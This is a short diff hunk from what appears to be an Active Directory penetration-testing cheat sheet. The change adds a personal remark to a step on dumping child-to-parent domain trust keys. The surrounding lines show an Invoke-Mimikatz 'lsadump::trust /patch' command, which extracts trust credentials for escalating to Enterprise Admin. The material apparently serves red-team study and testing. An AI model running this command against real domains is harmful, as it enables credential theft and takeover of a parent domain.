@@ -1000,7 +1000,7 @@ Sc \\<dns server> start dns
 ## Enterprise Admins
 ### Child to parent - trust tickets
 #### Dump trust keys
-Look for in trust key from child to parent (first command)
+Look for in trust key from child to parent (first command) - This worked best for me! Second command didnt work :(
 Look for NTLM hash (second command)
 ```
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
